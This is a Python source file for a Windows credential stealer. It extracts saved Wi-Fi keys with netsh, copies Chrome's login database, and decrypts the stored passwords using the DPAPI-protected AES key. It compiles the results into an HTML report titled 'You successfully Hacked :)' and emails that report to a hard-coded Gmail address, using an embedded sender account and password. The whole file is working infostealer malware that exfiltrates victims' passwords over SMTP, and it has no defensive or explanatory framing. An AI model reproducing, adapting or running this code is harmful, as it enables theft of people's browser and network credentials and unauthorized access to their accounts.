try:
    import os
    import json
    import base64
    import sqlite3
    import win32crypt
    from Cryptodome.Cipher import AES
    import shutil
    from datetime import datetime, timedelta
    import subprocess
    import smtplib
    import ssl
    # import pandas as pd
    # from pprint import pprint
    # from tabulate import tabulate
    from email.message import EmailMessage
    import ctypes
    import os
    # from pyautogui import hotkey
except ImportError as e:
    pass
    # print(e)

mac_name = subprocess.check_output("hostname").decode("utf-8").split("\r\n")[0]
# email_body = open(f"my books/{mac_name}.txt", "r")
# wifi_dict = {}
# wifi_error_dict = {}
#
# main_url_list = []
# login_list = []
# username_list = []
# passwords_list = []
# date_of_creation_list = []
# last_used_list = []
#
# chrome_dict = {}


def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)


def fetching_encryption_key():
    # Local_computer_directory_path will look
    # like this below
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State
    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State")

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])

    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]

    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except Exception as e:
        pass
        # print(e)

        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"


def wifi_passwords():
    try:
        os.makedirs("my books")
    except OSError as error:
        # print(error)
        pass
    # machine_name = subprocess.check_output("hostname").decode("utf-8").split("\r\n")[0]
    data = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8").split("\n")
    wifis = [line.split(":")[1][1:-1] for line in data if "All User Profile" in line]
    file = open(f"my books/{mac_name}.txt", "a")
    file_html = open(f"my books/{mac_name}_html.txt", "a")

    file2 = open(f"my books/{mac_name}_not_found.txt", "a")
    try:
        for wifi in wifis:
            try:
                results = subprocess.check_output(["netsh", "wlan", "show", "profile", wifi, "key=clear"]).decode(
                    "utf-8").split("\n")
                results = [line.split(":")[1][1:-1] for line in results if "Key Content" in line]
            except Exception as e:
                pass
                # print(e)
            try:
                # print(f"Wifi name: {wifi}\nPassword: {results[0]}")
                file.write(f"Wifi name: {wifi}\nPassword: {results[0]}\n")
                file_html.write(f"<tr><td>{wifi}</td><td> {results[0]}</td></tr>")

                # wifi_dict[wifi] = results[0]


            except IndexError:
                # print(f"Wifi name: {wifi}\nPassword: Not found")
                file2.write(f"Wifi name: {wifi}\nPassword: Not found\n")
                # wifi_error_dict[wifi] = "Not found"
    except Exception as e:
        # print(wifi, "is causing an error\n", e)
        # print(e)
        file2.write(f"{wifi} is causing an error\n {e}")
        # wifi_error_dict[wifi] = "error"



def main():
    wifi_passwords()
    # hotkey("win", "down")
    # machine_name_chrome = subprocess.check_output("hostname").decode("utf-8").split("\r\n")[0]
    file_chrome = open(f"my books/{mac_name}_nice.txt", "a")
    file_chrome_new = open(f"my books/{mac_name}_done.txt", "w")
    # file2_chrome = open(f"{machine_name_chrome}_not_found.txt", "a")
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)

    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]

        if user_name or decrypted_password:
            file_chrome.write(f"Main URL: {main_url}\nLogin URL: {login_page_url}\nUser name: {user_name}\nDecrypted Password: {decrypted_password}\n")
            # main_url_list.append(main_url)
            # login_list.append(login_page_url)
            # username_list.append(user_name)
            # passwords_list.append(decrypted_password)

            # print(f"Main URL: {main_url}")
            # print(f"Login URL: {login_page_url}")
            # print(f"User name: {user_name}")
            # print(f"Decrypted Password: {decrypted_password}")

        else:
            continue

        if date_of_creation != 86400000000 and date_of_creation:
            file_chrome.write(f"Creation date: {str(chrome_date_and_time(date_of_creation))}\n")
            # date_of_creation_list.append(str(chrome_date_and_time(date_of_creation)))
            # print(f"Creation date: {str(chrome_date_and_time(date_of_creation))}\n")

        if last_usuage != 86400000000 and last_usuage:
            file_chrome.write(f"Last Used: {str(chrome_date_and_time(last_usuage))}\n")
            # last_used_list.append(str(chrome_date_and_time(last_usuage)))
            # print(f"Last Used: {str(chrome_date_and_time(last_usuage))}")
        file_chrome.write("=" * 100 + "\n")


    # chrome_dict["main"] = main_url_list
    # pandas_list = {'Main Url': [main_url_list],
    #                'Username': [username_list],
    #                'Login': [login_list],
    #                'Password': [passwords_list],
    #                'Date of Creation': [date_of_creation_list],
    #                'Last Used': [last_used_list],
    #
                   # }

        file_chrome_new.write(f"<tr><td>{main_url}</td><td> {login_page_url}</td><td>{user_name}</td><td>{decrypted_password}</td><td>{str(chrome_date_and_time(date_of_creation))}</td><td>{str(chrome_date_and_time(last_usuage))}</td></tr>")

    with open(f"my books/{mac_name}_done.txt", "r") as fresh:
        done = fresh.read()

    with open(f"my books/{mac_name}_html.txt", "r") as wi_fi:
        wire = wi_fi.read()


    file = f""" 
    	
<!DOCTYPE html> 
<html lang="en"> 

<body> 
    <style>
        table {{
            border-collapse: collapse;
            font-family: Tahoma, Geneva, sans-serif;
        }}
        table td {{
            padding: 15px;
        }}
        table thead td {{
            background-color: #54585d;
            color: #ffffff;
            font-weight: bold;
            font-size: 13px;
            border: 1px solid #54585d;
        }}
        table tbody td {{
            color: #636363;
            border: 1px solid #dddfe1;
        }}
        table tbody tr {{
            background-color: #f9fafb;
        }}
        table tbody tr:nth-child(odd) {{
            background-color: #ffffff;
        }}
    </style> 
    <h1>You successfully Hacked :) {mac_name}</h1>
     <h1>Chrome Passwords</h1>
    <table>
        <thead>
        <tr><th style="text-align: right;"></th>
        <th>Main Url</th>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
        <th>Login</th>
        <th>Password</th>
        <th>Date of creation</th>
        <th>Last Used</th>
        </thead>
        <tbody>
            {done}
        </tbody>
        </table>

        <h1>Wifi Passwords</h1>
    <table>
        <thead>
        <tr><th style="text-align: right;"></th>
        <th>Wifi Name</th>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
        <th>Wifi Passwords</th>
        </thead>
        <tbody>
            {wire}
        </tbody>
        </table>
</body> 
</html> 



    """

    # print(done)

    # pandas_list = {'Main Url': [main_url_list],
    #                'Username': [username_list],
    #                'Login': [login_list],
    #                'Password': [passwords_list],
    #                'Date of Creation': [date_of_creation_list],
    #                'Last Used': [last_used_list],
    #
    #                }

    # creating a dataframe from dictionary
    # df = pd.DataFrame(pandas_list, columns= ['Main Url', 'Username', 'Login', 'Password', 'Date of Creation', 'Last Used'])
    # print(df.apply(lambda row:row['Password'], axis=1))
    # for ind in df.index:
    #     # print(df['Main Url'][ind], df['Username'][ind])
    #     print(df.loc[ind, 'Main Url'])
    # df.style
    # df.to_csv("moon.csv")
    # neat = tabulate(df, headers='keys', tablefmt='html')
    # print(neat)
    # print(pd.concat([pd.DataFrame(dict(zip(df.columns, df.ix[i])))]))
    # print(pprint(tabulate(df, headers='keys', tablefmt='html')))
    
    # print(df)
        # print("=" * 100)
    cursor.close()
    db.close()

    try:
        send_mail(file)
    except Exception as e:
        # print(e)
        pass

    try:

        # trying to remove the copied db file as
        # well from local computer
        os.remove(filename)
    except Exception as e:
        # print(e)
        pass


def get_email_body():
    with open(f"my books/{mac_name}.txt", "r") as file1:
        data = file1.read()

    with open(f"my books/{mac_name}_not_found.txt", "r") as file2:
        data1 = file2.read()

    with open(f"my books/{mac_name}_nice.txt", "r") as file3:
        data2 = file3.read()

    email = open(f"my books/{mac_name}_okay.txt", "a")
    # file2 = open(f"my books/{mac_name}_not_found.txt", "a")
    email = data + "\n" + data1 + "\n" + data2
    return email
    # print(email)


def send_mail(text):
    subject = f"You successfully Hacked :) {mac_name}"
    body = "Success"
    sender_email = "entropygh@gmail.com"
    receiver_email = "stephendappah1@gmail.com"
    password = "entropyaseidu123"
    message = EmailMessage()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    html = text

    message.add_alternative(html, subtype="html")

    context = ssl.create_default_context()

    # print("Sending Email!")

    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())

    # print("Success")



if __name__ == "__main__":
    # hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    # if hwnd != 0:
    #     ctypes.windll.user32.ShowWindow(hwnd, 0)
    #     ctypes.windll.kernel32.CloseHandle(hwnd)
    #     _, pid = win32process.GetWindowThreadProcessId(hwnd)
    #     os.system('taskkill /PID ' + str(pid) + ' /f')
    # start = time.time()
    main()
    # print(wifi_dict)
    # print(wifi_error_dict)
    # print(chrome_dict)
    # get_email_body()
    # send_mail()
    # end = time
    # .time() - start
    # print(end)